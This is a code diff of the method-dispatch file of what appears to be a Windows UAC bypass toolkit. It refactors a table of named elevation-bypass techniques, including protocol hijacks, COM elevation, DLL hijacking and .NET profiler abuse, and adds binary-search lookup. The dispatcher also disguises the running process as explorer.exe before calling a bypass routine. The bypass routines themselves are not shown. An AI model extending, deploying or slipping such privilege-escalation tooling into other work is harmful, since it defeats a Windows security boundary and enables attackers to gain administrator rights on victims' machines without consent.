@@ -6,7 +6,7 @@
 *
 *  VERSION:     3.70
 *
-*  DATE:        19 May 2026
+*  DATE:        21 May 2026
 *
 *  UAC bypass dispatch.
 *
@@ -57,127 +57,142 @@ UCM_API(MethodQuickAssist);
 UCM_API(MethodCleanMgrAdmin);
 
 ULONG UCM_WIN32_NOT_IMPLEMENTED[] = {
-    UacMethodWow64Logger,
-    UacMethodEditionUpgradeMgr,
     UacMethodNICPoison,
     UacMethodIeAddOnInstall,
-    UacMethodWscActionProtocol,
-    UacMethodFwCplLua2,
     UacMethodMsSettingsProtocol,
     UacMethodMsStoreProtocol,
-    UacMethodPca,
     UacMethodCurVer,
     UacMethodVFServerTaskSched,
     UacMethodVFServerDiagProf,
     UacMethodAtlHijack,
-    UacMethodSspiDatagram,
-    UacMethodRequestTrace,
     UacMethodQuickAssist,
     UacMethodCleanMgrAdmin
 };
 
-UCM_API_DISPATCH_ENTRY ucmMethodsDispatchTable[UCM_DISPATCH_ENTRY_MAX] = {
-    { MethodTest, { NT_WIN7_RTM, MAXDWORD }, FUBUKI_ID, FALSE, TRUE, TRUE },
-    { MethodDeprecated, { NT_WIN7_RTM, MAXDWORD }, PAYLOAD_ID_NONE, FALSE, FALSE, FALSE },
-    { MethodDeprecated, { NT_WIN7_RTM, MAXDWORD }, PAYLOAD_ID_NONE, FALSE, FALSE, FALSE },
-    { MethodDeprecated, { NT_WIN7_RTM, MAXDWORD }, PAYLOAD_ID_NONE, FALSE, FALSE, FALSE },
-    { MethodDeprecated, { NT_WIN7_RTM, MAXDWORD }, PAYLOAD_ID_NONE, FALSE, FALSE, FALSE },
-    { MethodDeprecated, { NT_WIN7_RTM, MAXDWORD }, PAYLOAD_ID_NONE, FALSE, FALSE, FALSE },
-    { MethodDeprecated, { NT_WIN7_RTM, MAXDWORD }, PAYLOAD_ID_NONE, FALSE, FALSE, FALSE },
-    { MethodDeprecated, { NT_WIN7_RTM, MAXDWORD }, PAYLOAD_ID_NONE, FALSE, FALSE, FALSE },
-    { MethodDeprecated, { NT_WIN7_RTM, MAXDWORD }, PAYLOAD_ID_NONE, FALSE, FALSE, FALSE },
-    { MethodDeprecated, { NT_WIN7_RTM, MAXDWORD }, PAYLOAD_ID_NONE, FALSE, FALSE, FALSE },
-    { MethodDeprecated, { NT_WIN7_RTM, MAXDWORD }, PAYLOAD_ID_NONE, FALSE, FALSE, FALSE },
-    { MethodDeprecated, { NT_WIN7_RTM, MAXDWORD }, PAYLOAD_ID_NONE, FALSE, FALSE, FALSE },
-    { MethodDeprecated, { NT_WIN7_RTM, MAXDWORD }, PAYLOAD_ID_NONE, FALSE, FALSE, FALSE },
-    { MethodDeprecated, { NT_WIN7_RTM, MAXDWORD }, PAYLOAD_ID_NONE, FALSE, FALSE, FALSE },
-    { MethodDeprecated, { NT_WIN7_RTM, MAXDWORD }, PAYLOAD_ID_NONE, FALSE, FALSE, FALSE },
-    { MethodDeprecated, { NT_WIN7_RTM, MAXDWORD }, PAYLOAD_ID_NONE, FALSE, FALSE, FALSE },
-    { MethodDeprecated, { NT_WIN7_RTM, MAXDWORD }, PAYLOAD_ID_NONE, FALSE, FALSE, FALSE },
-    { MethodDeprecated, { NT_WIN7_RTM, MAXDWORD }, PAYLOAD_ID_NONE, FALSE, FALSE, FALSE },
-    { MethodDeprecated, { NT_WIN7_RTM, MAXDWORD }, PAYLOAD_ID_NONE, FALSE, FALSE, FALSE },
-    { MethodDeprecated, { NT_WIN7_RTM, MAXDWORD }, PAYLOAD_ID_NONE, FALSE, FALSE, FALSE },
-    { MethodDeprecated, { NT_WIN7_RTM, MAXDWORD }, PAYLOAD_ID_NONE, FALSE, FALSE, FALSE },
-    { MethodDeprecated, { NT_WIN7_RTM, MAXDWORD }, PAYLOAD_ID_NONE, FALSE, FALSE, FALSE },
-    { MethodSXS, { NT_WIN7_RTM, NT_WIN11_21H2 }, FUBUKI_ID, FALSE, TRUE, TRUE },
-    { MethodDism, { NT_WIN7_RTM, MAXDWORD }, FUBUKI_ID, FALSE, TRUE, TRUE },
-    { MethodDeprecated, { NT_WIN7_RTM, MAXDWORD }, PAYLOAD_ID_NONE, FALSE, FALSE, FALSE },
-    { MethodDeprecated, { NT_WIN7_RTM, MAXDWORD }, PAYLOAD_ID_NONE, FALSE, FALSE, FALSE },
-    { MethodDeprecated, { NT_WIN7_RTM, MAXDWORD }, PAYLOAD_ID_NONE, FALSE, FALSE, FALSE },
-    { MethodDeprecated, { NT_WIN7_RTM, MAXDWORD }, PAYLOAD_ID_NONE, FALSE, FALSE, FALSE },
-    { MethodDeprecated, { NT_WIN7_RTM, MAXDWORD }, PAYLOAD_ID_NONE, FALSE, FALSE, FALSE },
-    { MethodDeprecated, { NT_WIN7_RTM, MAXDWORD }, PAYLOAD_ID_NONE, FALSE, FALSE, FALSE },
-    { MethodWow64Logger, { NT_WIN7_RTM, NT_WIN11_21H2 }, AKATSUKI_ID, FALSE, TRUE, TRUE },
-    { MethodDeprecated, { NT_WIN7_RTM, MAXDWORD }, PAYLOAD_ID_NONE, FALSE, FALSE, FALSE },
-    { MethodUiAccess, { NT_WIN7_RTM, MAXDWORD }, FUBUKI_ID, FALSE, TRUE, TRUE },
-    { MethodMsSettings, { NT_WIN10_THRESHOLD1, MAXDWORD }, PAYLOAD_ID_NONE, FALSE, FALSE, FALSE },
-    { MethodTyranid, { NT_WIN8_BLUE, MAXDWORD }, PAYLOAD_ID_NONE, FALSE, FALSE, FALSE },
-    { MethodDeprecated, { NT_WIN7_RTM, MAXDWORD }, PAYLOAD_ID_NONE, FALSE, FALSE, FALSE },
-    { MethodJunction, { NT_WIN7_RTM, NT_WIN11_21H2 }, FUBUKI_ID, FALSE, TRUE, TRUE },
-    { MethodSXSDccw, { NT_WIN7_RTM, NT_WIN11_21H2 }, FUBUKI_ID, FALSE, TRUE, TRUE },
-    { MethodHakril, { NT_WIN7_RTM, MAXDWORD }, FUBUKI_ID, FALSE, FALSE, TRUE },
-    { MethodCorProfiler, { NT_WIN7_RTM, MAXDWORD }, FUBUKI_ID, FALSE, TRUE, TRUE },
-    { MethodDeprecated, { NT_WIN7_RTM, MAXDWORD }, PAYLOAD_ID_NONE, FALSE, FALSE, FALSE },
-    { MethodCMLuaUtil, { NT_WIN7_RTM, MAXDWORD }, PAYLOAD_ID_NONE, FALSE, TRUE, FALSE },
-    { MethodDeprecated, { NT_WIN7_RTM, MAXDWORD }, PAYLOAD_ID_NONE, FALSE, FALSE, FALSE },
-    { MethodDccwCOM, { NT_WIN7_RTM, MAXDWORD }, PAYLOAD_ID_NONE, FALSE, TRUE, TRUE },
-    { MethodDeprecated, { NT_WIN7_RTM, MAXDWORD }, PAYLOAD_ID_NONE, FALSE, FALSE, FALSE },
-    { MethodDeprecated, { NT_WIN7_RTM, MAXDWORD }, PAYLOAD_ID_NONE, FALSE, FALSE, FALSE },
-    { MethodDeprecated, { NT_WIN7_RTM, MAXDWORD }, PAYLOAD_ID_NONE, FALSE, FALSE, FALSE },
-    { MethodDeprecated, { NT_WIN7_RTM, MAXDWORD }, PAYLOAD_ID_NONE, FALSE, FALSE, FALSE },
-    { MethodDeprecated, { NT_WIN7_RTM, MAXDWORD }, PAYLOAD_ID_NONE, FALSE, FALSE, FALSE },
-    { MethodDeprecated, { NT_WIN7_RTM, MAXDWORD }, PAYLOAD_ID_NONE, FALSE, FALSE, FALSE },
-    { MethodDeprecated, { NT_WIN7_RTM, MAXDWORD }, PAYLOAD_ID_NONE, FALSE, FALSE, FALSE },
-    { MethodDeprecated, { NT_WIN7_RTM, MAXDWORD }, PAYLOAD_ID_NONE, FALSE, FALSE, FALSE },
-    { MethodDirectoryMock, { NT_WIN7_RTM, NT_WIN11_21H2 }, FUBUKI_ID, FALSE, TRUE, TRUE },
-    { MethodShellSdctl, { NT_WIN10_REDSTONE1, MAXDWORD }, PAYLOAD_ID_NONE, FALSE, FALSE, FALSE },
-    { MethodDeprecated, { NT_WIN7_RTM, MAXDWORD }, PAYLOAD_ID_NONE, FALSE, FALSE, FALSE },
-    { MethodTokenModUIAccess, { NT_WIN7_RTM, MAXDWORD }, FUBUKI_ID, FALSE, TRUE, FALSE },
-    { MethodDeprecated, { NT_WIN7_RTM, MAXDWORD }, PAYLOAD_ID_NONE, FALSE, FALSE, FALSE },
-    { MethodDeprecated, { NT_WIN7_RTM, MAXDWORD }, PAYLOAD_ID_NONE, FALSE, FALSE, FALSE },
-    { MethodEditionUpgradeManager, { NT_WIN10_REDSTONE1, NT_WIN11_21H2 }, FUBUKI_ID, FALSE, TRUE, TRUE },
-    { MethodDebugObject, { NT_WIN7_RTM, MAXDWORD }, PAYLOAD_ID_NONE, FALSE, FALSE, FALSE },
-    { MethodDeprecated, { NT_WIN7_RTM, MAXDWORD }, PAYLOAD_ID_NONE, FALSE, FALSE, FALSE },
-    { MethodShellChangePk, { NT_WIN10_REDSTONE1, MAXDWORD }, PAYLOAD_ID_NONE, FALSE, FALSE, FALSE },
-    { MethodMsSettings, { NT_WIN10_REDSTONE4, MAXDWORD }, PAYLOAD_ID_NONE, FALSE, FALSE, FALSE },
-    { MethodNICPoison, { NT_WIN7_RTM, MAXDWORD }, FUBUKI_ID, FALSE, TRUE, TRUE },
-    { MethodIeAddOnInstall, { NT_WIN7_RTM, MAXDWORD }, FUBUKI_ID, FALSE, TRUE, TRUE },
-    { MethodWscActionProtocol, { NT_WIN7_RTM, NT_WIN11_24H2 }, PAYLOAD_ID_NONE, FALSE, TRUE, FALSE },
-    { MethodFwCplLua2, { NT_WIN7_RTM, NT_WIN11_24H2 }, PAYLOAD_ID_NONE, FALSE, TRUE, FALSE },
-    { MethodProtocolHijack, { NT_WIN10_THRESHOLD1, MAXDWORD }, PAYLOAD_ID_NONE, FALSE, TRUE, FALSE },
-    { MethodProtocolHijack, { NT_WIN10_REDSTONE5, MAXDWORD }, PAYLOAD_ID_NONE, FALSE, TRUE, FALSE },
-    { MethodPca, { NT_WIN7_RTM, NT_WIN11_24H2 }, FUBUKI_ID, FALSE, TRUE, TRUE },
-    { MethodCurVer, { NT_WIN10_THRESHOLD1, MAXDWORD }, PAYLOAD_ID_NONE, FALSE, FALSE, FALSE },
-    { MethodNICPoison, { NT_WIN7_RTM, MAXDWORD }, FUBUKI_ID, FALSE, TRUE, TRUE },
-    { MethodMsdt, { NT_WIN10_THRESHOLD1, MAXDWORD }, FUBUKI32_ID, FALSE, FALSE, TRUE },
-    { MethodDotNetSerial, { NT_WIN7_RTM, NT_WIN11_24H2 }, PAYLOAD_ID_NONE, FALSE, TRUE, FALSE },
-    { MethodVFServerTaskSched, { NT_WIN8_BLUE, MAXDWORD}, AKATSUKI_ID, FALSE, TRUE, TRUE },
-    { MethodVFServerDiagProf, { NT_WIN7_RTM, MAXDWORD}, AKATSUKI_ID, FALSE, TRUE, TRUE },
-    { MethodIscsiCpl, { NT_WIN7_RTM, MAXDWORD }, FUBUKI32_ID, FALSE, FALSE, TRUE },
-    { MethodAtlHijack, { NT_WIN7_RTM, MAXDWORD }, FUBUKI_ID, FALSE, TRUE, TRUE },
-    { MethodSspiDatagram, { NT_WIN7_RTM, MAXDWORD }, AKATSUKI_ID, FALSE, TRUE, TRUE },
-    { MethodTokenModUIAccess, { NT_WIN10_19H1, MAXDWORD }, FUBUKI_ID, FALSE, TRUE, TRUE },
-    { MethodRequestTrace, { NT_WIN11_24H2, NT_WIN11_25H2 }, FUBUKI_ID, FALSE, TRUE, TRUE },
-    { MethodQuickAssist, { NT_WIN10_REDSTONE5, MAXDWORD }, FUBUKI_ID, FALSE, TRUE, TRUE },
-    { MethodCleanMgrAdmin, { NT_WIN10_21H2, MAXDWORD }, FUBUKI_ID, FALSE, TRUE, TRUE }
+UCM_API_DISPATCH_ENTRY ucmMethodsDispatchTable[] = {
+    { UacMethodTest,                MethodTest, { NT_WIN7_RTM, MAXDWORD }, FUBUKI_ID, FALSE, TRUE, TRUE },
+    { UacMethodDISM,                MethodDism, { NT_WIN7_RTM, MAXDWORD }, FUBUKI_ID, FALSE, TRUE, TRUE },
+    { UacMethodUiAccess,            MethodUiAccess, { NT_WIN7_RTM, MAXDWORD }, FUBUKI_ID, FALSE, TRUE, TRUE },
+    { UacMethodMsSettings,          MethodMsSettings, { NT_WIN10_THRESHOLD1, MAXDWORD }, PAYLOAD_ID_NONE, FALSE, FALSE, FALSE },
+    { UacMethodDiskSilentCleanup,   MethodTyranid, { NT_WIN8_BLUE, MAXDWORD }, PAYLOAD_ID_NONE, FALSE, FALSE, FALSE },
+    { UacMethodHakril,              MethodHakril, { NT_WIN7_RTM, MAXDWORD }, FUBUKI_ID, FALSE, FALSE, TRUE },
+    { UacMethodCorProfiler,         MethodCorProfiler, { NT_WIN7_RTM, MAXDWORD }, FUBUKI_ID, FALSE, TRUE, TRUE },
+    { UacMethodCMLuaUtil,           MethodCMLuaUtil, { NT_WIN7_RTM, MAXDWORD }, PAYLOAD_ID_NONE, FALSE, TRUE, FALSE },
+    { UacMethodDccwCOM,             MethodDccwCOM, { NT_WIN7_RTM, MAXDWORD }, PAYLOAD_ID_NONE, FALSE, TRUE, TRUE },
+    { UacMethodShellSdclt,          MethodShellSdctl, { NT_WIN10_REDSTONE1, MAXDWORD }, PAYLOAD_ID_NONE, FALSE, FALSE, FALSE },
+    { UacMethodDebugObject,         MethodDebugObject, { NT_WIN7_RTM, MAXDWORD }, PAYLOAD_ID_NONE, FALSE, FALSE, FALSE },
+    { UacMethodShellChangePk,       MethodShellChangePk, { NT_WIN10_REDSTONE1, MAXDWORD }, PAYLOAD_ID_NONE, FALSE, FALSE, FALSE },
+    { UacMethodMsSettings2,         MethodMsSettings, { NT_WIN10_REDSTONE4, MAXDWORD }, PAYLOAD_ID_NONE, FALSE, FALSE, FALSE },
+    { UacMethodNICPoison,           MethodNICPoison, { NT_WIN7_RTM, MAXDWORD }, FUBUKI_ID, FALSE, TRUE, TRUE },
+    { UacMethodIeAddOnInstall,      MethodIeAddOnInstall, { NT_WIN7_RTM, MAXDWORD }, FUBUKI_ID, FALSE, TRUE, TRUE },
+    { UacMethodMsSettingsProtocol,  MethodProtocolHijack, { NT_WIN10_THRESHOLD1, MAXDWORD }, PAYLOAD_ID_NONE, FALSE, TRUE, FALSE },
+    { UacMethodMsStoreProtocol,     MethodProtocolHijack, { NT_WIN10_REDSTONE5, MAXDWORD }, PAYLOAD_ID_NONE, FALSE, TRUE, FALSE },
+    { UacMethodCurVer,              MethodCurVer, { NT_WIN10_THRESHOLD1, MAXDWORD }, PAYLOAD_ID_NONE, FALSE, FALSE, FALSE },
+    { UacMethodNICPoison2,          MethodNICPoison, { NT_WIN7_RTM, MAXDWORD }, FUBUKI_ID, FALSE, TRUE, TRUE },
+    { UacMethodMsdt,                MethodMsdt, { NT_WIN10_THRESHOLD1, MAXDWORD }, FUBUKI32_ID, FALSE, FALSE, TRUE },
+    { UacMethodVFServerTaskSched,   MethodVFServerTaskSched, { NT_WIN8_BLUE, MAXDWORD}, AKATSUKI_ID, FALSE, TRUE, TRUE },
+    { UacMethodVFServerDiagProf,    MethodVFServerDiagProf, { NT_WIN7_RTM, MAXDWORD}, AKATSUKI_ID, FALSE, TRUE, TRUE },
+    { UacMethodIscsiCpl,            MethodIscsiCpl, { NT_WIN7_RTM, MAXDWORD }, FUBUKI32_ID, FALSE, FALSE, TRUE },
+    { UacMethodAtlHijack,           MethodAtlHijack, { NT_WIN7_RTM, MAXDWORD }, FUBUKI_ID, FALSE, TRUE, TRUE },
+    { UacMethodQuickAssist,         MethodQuickAssist, { NT_WIN10_REDSTONE5, MAXDWORD }, FUBUKI_ID, FALSE, TRUE, TRUE },
+    { UacMethodCleanMgrAdmin,       MethodCleanMgrAdmin, { NT_WIN10_21H2, MAXDWORD }, FUBUKI_ID, FALSE, TRUE, TRUE }
 };
 
 /*
-* IsMethodImplementedForWin32
+* MethodsManagerIdExist
 *
 * Purpose:
 *
-* Check if method implemented in win32 version.
+* Check if method is exist in the given array.
 *
 */
-__forceinline BOOL IsMethodImplementedForWin32(
+BOOL MethodsManagerIdExist(
+    _In_reads_(dwCount) const ULONG* pulArray,
+    _In_ DWORD dwCount,
+    _In_ ULONG ulValue
+)
+{
+    DWORD dwLow = 0, dwHigh, dwMid;
+
+    if (pulArray == NULL || dwCount == 0)
+        return FALSE;
+
+    dwHigh = dwCount - 1;
+
+    while (dwLow <= dwHigh) {
+        dwMid = dwLow + (dwHigh - dwLow) / 2;
+
+        if (pulArray[dwMid] == ulValue) {
+            return TRUE;
+        }
+        else if (pulArray[dwMid] < ulValue) {
+            dwLow = dwMid + 1;
+        } else {
+            if (dwMid == 0) {
+                break;
+            }
+            dwHigh = dwMid - 1;
+        }
+    }
+
+    return FALSE;
+}
+
+/*
+* IsMethodNotImplementedForWin32
+*
+* Purpose:
+*
+* Check if method is not implemented in win32 version.
+*
+*/
+__forceinline BOOL IsMethodNotImplementedForWin32(
     _In_ UCM_METHOD Method)
 {
-    UINT i;
-    for (i = 0; i < RTL_NUMBER_OF(UCM_WIN32_NOT_IMPLEMENTED); i++)
-        if (UCM_WIN32_NOT_IMPLEMENTED[i] == (ULONG)Method)
-            return FALSE;
-    return TRUE;
+    return MethodsManagerIdExist(UCM_WIN32_NOT_IMPLEMENTED,
+        RTL_NUMBER_OF(UCM_WIN32_NOT_IMPLEMENTED),
+        (ULONG)Method);
+}
+
+/*
+* MethodsManagerGetMethodById
+*
+* Purpose:
+*
+* Return method data by method id.
+*
+*/
+PUCM_API_DISPATCH_ENTRY MethodsManagerGetMethodById(
+    _In_reads_(dwCount) const PUCM_API_DISPATCH_ENTRY pEntries,
+    _In_ DWORD dwCount,
+    _In_ UCM_METHOD Method
+)
+{
+    DWORD dwLow = 0, dwHigh, dwMid;
+
+    if (pEntries == NULL || dwCount == 0)
+        return NULL;
+
+    dwHigh = dwCount - 1;
+
+    while (dwLow <= dwHigh) {
+        dwMid = dwLow + (dwHigh - dwLow) / 2;
+
+        if (pEntries[dwMid].MethodId == Method) {
+            return &pEntries[dwMid];
+        }
+        else if (pEntries[dwMid].MethodId < Method) {
+            dwLow = dwMid + 1;
+        }
+        else {
+            if (dwMid == 0) {
+                break;
+            }
+            dwHigh = dwMid - 1;
+        }
+    }
+
+    return NULL;
 }
 
 /*
@@ -311,6 +326,15 @@ NTSTATUS MethodsManagerCall(
         return STATUS_INVALID_PARAMETER;
     }
 
+#ifndef _WIN64
+    //
+    // Is method implemented for Win32?
+    //
+    if (IsMethodNotImplementedForWin32(Method)) {
+        return STATUS_NOT_SUPPORTED;
+    }
+#endif //_WIN64
+
     if (Method != UacMethodTest) {
         // For a COM elevation pick random executable from trusted list.
         RtlSecureZeroMemory(&TrustedAppList, sizeof(TrustedAppList));
@@ -327,19 +351,13 @@ NTSTATUS MethodsManagerCall(
             supMasqueradeProcess(FALSE, EXPLORER_EXE);
     }
 
-    //
-    // Is method implemented for Win32?
-    //
-#ifndef _WIN64
-    if (!IsMethodImplementedForWin32(Method)) {
-        return STATUS_NOT_SUPPORTED;
+    Entry = MethodsManagerGetMethodById(ucmMethodsDispatchTable, RTL_NUMBER_OF(ucmMethodsDispatchTable), Method);
+    if (Entry == NULL) {
+        //
+        // Not implemented or deprecated.
+        //
+        return STATUS_NOT_IMPLEMENTED;
     }
-#endif //_WIN64
-
-#pragma warning(push)
-#pragma warning(disable:33010) //BS disable.
-    Entry = &ucmMethodsDispatchTable[Method];
-#pragma warning(pop)
 
     Status = IsMethodMatchRequirements(Entry);
     if (!NT_SUCCESS(Status))
@@ -389,7 +407,7 @@ NTSTATUS MethodsManagerCall(
     //
     if (Entry->SetParameters) {
         bParametersBlockSet = supCreateSharedParametersBlock(g_ctx);
-        ucmConsolePrintValueUlong(TEXT("[+] MethodsManagerCall->bParametersBlockSet"), bParametersBlockSet, FALSE);
+        ucmConsolePrintValueUlong(TEXT("[+] MethodsManagerCall->supCreateSharedParametersBlock"), bParametersBlockSet, FALSE);
     }
 
     MethodResult = Entry->Routine(&ParamsBlock);
